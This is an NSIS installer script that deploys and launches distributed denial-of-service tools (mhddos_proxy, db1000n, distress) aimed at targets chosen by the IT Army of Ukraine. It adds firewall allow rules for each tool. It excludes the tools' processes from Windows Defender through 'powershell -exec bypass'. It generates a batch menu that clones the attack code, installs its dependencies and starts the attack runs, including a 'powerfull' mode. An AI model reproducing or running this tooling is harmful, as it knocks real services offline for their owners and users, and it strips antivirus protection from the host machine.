Var uninstallerPath

Section "-hidden"

    ;Search if mhddos_proxy_installer is already installed.
    FindFirst $0 $1 "$uninstallerPath\${UNINSTALLER_NAME}.exe"
    FindClose $0
    StrCmp $1 "" done

    ;Run the uninstaller of the previous install.
    DetailPrint $(inst_unist)
    ExecWait '"$uninstallerPath\${UNINSTALLER_NAME}.exe" /S _?=$uninstallerPath'
    Delete "$uninstallerPath\${UNINSTALLER_NAME}.exe"
    RMDir "$uninstallerPath"

    done:

SectionEnd

Var info_down_btn
Var info_label_1
Var info_label_2
Var info_font

Function win7_info
${If} ${IsWin7}
  ; custom font definitions
  CreateFont $info_font "Microsoft Sans Serif" "9.75" "700"
  
  ; === info (type: Dialog) ===
  nsDialogs::Create 1018
  Pop $0
	
  !insertmacro MUI_HEADER_TEXT $(inf_title) $(inf_subtitle)
  
  ; === down_btn (type: Button) ===
  ${NSD_CreateButton} 217u 106u 64u 15u $(inf_button)
  Pop $info_down_btn
  ${NSD_OnClick} $info_down_btn download_updater
  
  ; === label_1 (type: Label) ===
  ${NSD_CreateLabel} 8u 20u 280u 28u $(inf_lable_1)
  Pop $info_label_1
  SendMessage $info_label_1 ${WM_SETFONT} $info_font 0
  
  ; === label_2 (type: Label) ===
  ${NSD_CreateLabel} 8u 71u 273u 22u $(inf_lable_2)
  Pop $info_label_2
  
	nsDialogs::Show
${EndIf}
FunctionEnd

Function download_updater
    ExecShell "open" "https://update7.simplix.info/UpdatePack7R2.exe" 
FunctionEnd

Section
  SectionIn RO # Just means if in component mode this is locked

  ;Set output path to the installation directory.
  SetOutPath $INSTDIR

  ;Store installation folder in registry
  WriteRegStr HKLM "Software\${PRODUCT}" "" $INSTDIR

  ;Registry information for add/remove programs
  
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayName" "${PRODUCT}"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "UninstallString" '"$INSTDIR\${UNINSTALLER_NAME}.exe"'
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayIcon" '"$INSTDIR\itarmy.ico",0'
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "Publisher" "UkITA Installer"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "URLInfoAbout" "https://github.com/OleksandrBlack/ukita_installer"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayVersion" "${PRODUCT_VERSION}"
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "NoModify" 1
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "NoRepair" 1
  WriteUninstaller "${UNINSTALLER_NAME}.exe"
  ${GetSize} "$INSTDIR" "/S=0K" $0 $1 $2
  IntFmt $0 "0x%08X" $0
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "EstimatedSize" "$0"

  ;Create optional start menu shortcut for uninstaller and Main component
  CreateDirectory "$SMPROGRAMS\${PRODUCT}"
  CreateShortCut "$SMPROGRAMS\${PRODUCT}\Uninstall ${PRODUCT}.lnk" "$INSTDIR\${UNINSTALLER_NAME}.exe" "" "$INSTDIR\${UNINSTALLER_NAME}.exe" 0

  ;Create uninstaller
  WriteUninstaller "${UNINSTALLER_NAME}.exe"
SectionEnd

Section
	SectionIn RO
	SetOutPath ${GIT_DIR}
	
	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_git_in" dir=in action=allow program="${GIT_DIR}\git.exe" enable=yes"'
	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_git_out" dir=out action=allow program="${GIT_DIR}\git.exe" enable=yes"'
	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "git.exe""'

	File /r "requirements\git\*"
SectionEnd

Section
	SectionIn RO
	SetOutPath ${PYTHON_DIR}
	
	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_python_in" dir=in action=allow program="${PYTHON_DIR}\python.exe" enable=yes"'
	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_python_out" dir=out action=allow program="${PYTHON_DIR}\python.exe" enable=yes"'
	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "python.exe""'
 
	${If} ${RunningX64}
		File /r "requirements\python\x64\*"
	${Else}
		File /r "requirements\python\x86\*"
	${EndIf}  
SectionEnd

Section ;RUNNER
  SetOutPath $INSTDIR
  
  FileOpen $9 runner.bat w
  FileWrite $9 "@ECHO off$\r$\n"
  FileWrite $9 "SET AUTO_MH=1$\r$\n"
  FileWrite $9 "SET PATH=${PYTHON_DIR};${PYTHON_DIR}\Scripts;${GIT_DIR}\git;%PATH%$\r$\n"
  FileWrite $9 "CLS$\r$\n"
  FileWrite $9 "COLOR 0A$\r$\n"
  
  FileWrite $9 ":MAIN$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='' goto MAIN_INFO)$\r$\n"
  FileWrite $9 ":RUN_MHDDOS_PROXY$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy' goto ITARMY)$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_powerfull' goto ITARMY_POWERFULL)$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_db1000n' goto ITARMY_DB1000N)$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_distress' goto ITARMY_DISTRESS)$\r$\n"

  FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy' goto CLONE_MHDDOS_PROXY)$\r$\n"
  
  FileWrite $9 ":MAIN_INFO$\r$\n"
  FileWrite $9 "ECHO.$\r$\n"
  FileWrite $9 "ECHO 1. Run MHDDOS_PROXY Attack$\r$\n"
  FileWrite $9 "ECHO 2. Run DB1000N Attack$\r$\n"
  FileWrite $9 "ECHO 3. Run DSTREES Attack$\r$\n"
  FileWrite $9 "set /p choice=Enter a number to start the action:$\r$\n"
  FileWrite $9 "if '%choice%'=='' ECHO '%choice%'  is not a valid option, please try again$\r$\n"
  FileWrite $9 "if '%choice%'=='1' goto ITARMY$\r$\n"
  FileWrite $9 "if '%choice%'=='2' goto ITARMY_DB1000N$\r$\n"
  FileWrite $9 "if '%choice%'=='3' goto ITARMY_DISTRESS$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":CLONE_MHDDOS_PROXY$\r$\n"
  FileWrite $9 "CD $INSTDIR$\r$\n"
  FileWrite $9 "git clone ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "python -m pip install --upgrade setuptools$\r$\n"
  FileWrite $9 "python -m pip install --upgrade pip$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":ITARMY$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start MHDDOS_PROXY Attack ItArmy Target$\r$\n"
  FileWrite $9 "python runner.py $(mhddos_lang) --itarmy$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":ITARMY_POWERFULL$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start MHDDOS_PROXY_POWERFULL Attack ItArmy Target$\r$\n"
  FileWrite $9 "python runner.py $(mhddos_lang) --itarmy --copies auto$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":ITARMY_DB1000N$\r$\n"
  FileWrite $9 "CD ${DB1000N_DIR}$\r$\n"
  FileWrite $9 "ECHO Start DB1000N Attack ItArmy Target$\r$\n"
  FileWrite $9 "db1000n.exe$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":ITARMY_DISTRESS$\r$\n"
  FileWrite $9 "CD ${DISTRESS_DIR}$\r$\n"
  FileWrite $9 "ECHO Start DISTRESS Attack ItArmy Target$\r$\n"
  ${If} ${RunningX64}
	FileWrite $9 "distress_x86_64-pc-windows-msvc.exe$\r$\n"
  ${Else}
	FileWrite $9 "distress_i686-pc-windows-msvc.exe$\r$\n"
  ${EndIf}
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":clone_proxy_finder$\r$\n"
  FileWrite $9 "CD $INSTDIR$\r$\n"
  FileWrite $9 "git clone ${proxy_finder_src} ${proxy_finder_dir}$\r$\n"
  FileWrite $9 "CD ${proxy_finder_dir}$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "goto END$\r$\n"

  FileWrite $9 ":END$\r$\n"
  FileWrite $9 "EXIT$\r$\n"
  FileClose $9
SectionEnd

Section	"mhddos_proxy";INSTALL MHDDOS_PROXY
  SetOutPath $INSTDIR
 
  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy"'
  
  File "resources\itarmy_mhddos.ico"
  File "resources\itarmy_mhddos_powerfull.ico"
   
  CreateShortCut "$DESKTOP\MHDDOS_PROXY.lnk" "$INSTDIR\runner.bat" "-itarmy" "$INSTDIR\itarmy_mhddos.ico" 0
  CreateShortCut "$DESKTOP\MHDDOS_PROXY_POWERFULL.lnk" "$INSTDIR\runner.bat" "-itarmy_powerfull" "$INSTDIR\itarmy_mhddos_powerfull.ico" 0

SectionEnd

Section	"db1000n"
	SetOutPath ${DB1000N_DIR}
	
	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_db1000n_in" dir=in action=allow program="${DB1000N_DIR}\db1000n.exe" enable=yes"'
	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_db1000n_out" dir=out action=allow program="${DB1000N_DIR}\db1000n.exe" enable=yes"'
	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "db1000n.exe""'
	
	File "resources\itarmy_d1000n.ico"

	${If} ${RunningX64}
		File /r "requirements\db1000n\x64\*"
	${Else}
		File /r "requirements\db1000n\x86\*"
	${EndIf}  
 
	CreateShortCut "$DESKTOP\DB1000N.lnk" "$INSTDIR\runner.bat" "-itarmy_db1000n" "${DB1000N_DIR}\itarmy_d1000n.ico" 0

SectionEnd

Section	"distress"
	SetOutPath ${DISTRESS_DIR}
	
	${If} ${RunningX64}
		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_in" dir=in action=allow program="${DISTRESS_DIR}\distress_x86_64-pc-windows-msvc.exe" enable=yes"'
		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_out" dir=out action=allow program="${DISTRESS_DIR}\distress_x86_64-pc-windows-msvc.exe" enable=yes"'
		nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "distress_x86_64-pc-windows-msvc.exe""'
	${Else}
		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_in" dir=in action=allow program="${DISTRESS_DIR}\distress_i686-pc-windows-msvc.exe" enable=yes"'
		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_out" dir=out action=allow program="${DISTRESS_DIR}\distress_i686-pc-windows-msvc.exe" enable=yes"'
		nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "distress_i686-pc-windows-msvc.exe""'
	${EndIf}
	
	File "resources\itarmy_distress.ico"

	${If} ${RunningX64}
		File /r "requirements\distress\x64\*"
	${Else}
		File /r "requirements\distress\x86\*"
	${EndIf}  
 
	CreateShortCut "$DESKTOP\DISTRESS.lnk" "$INSTDIR\runner.bat" "-itarmy_distress" "${DISTRESS_DIR}\itarmy_distress.ico" 0

SectionEnd


Function .onInit

  StrCpy $Language ${LANG_UKRAINIAN}
  !insertmacro MUI_LANGDLL_DISPLAY

  ;Search if mhddos_proxy_installer is already installed.
  FindFirst $0 $1 "$INSTDIR\${UNINSTALLER_NAME}.exe"
  FindClose $0
  StrCmp $1 "" done

  ;Copy old value to var so we can call the correct uninstaller
  StrCpy $uninstallerPath $INSTDIR

  ;Inform the user
  MessageBox MB_OKCANCEL|MB_ICONINFORMATION $(inst_uninstall_question) /SD IDOK IDOK done
  Quit

  done:

FunctionEnd

var TelegramCheckbox
var DiscordCheckbox

Function ShowFinishCheckbox
${NSD_CreateCheckbox} 125u 175u 100u 15u "Open Telegram Support"
Pop $TelegramCheckbox
SetCtlColors $TelegramCheckbox "" "ffffff"

${NSD_CreateCheckbox} 225u 175u 100u 15u "Open Discord Support"
Pop $DiscordCheckbox
SetCtlColors $DiscordCheckbox "" "ffffff"
FunctionEnd

Function OpenFinishLink
${NSD_GetState} $TelegramCheckbox $0
${If} $0 <> 0
    ExecShell "open" "https://t.me/itarmyofukraine2022"
${EndIf}

${NSD_GetState} $DiscordCheckbox $0
${If} $0 <> 0
    ExecShell "open" "https://discord.gg/rWTNk3UR"
${EndIf}
FunctionEnd



;--------------------------------
;After Installation Function

Function .onInstSuccess

  ;Open 'Thank you for installing' site or something else
  ;ExecShell "open" "https://t.me/itarmyofukraine2022"

FunctionEnd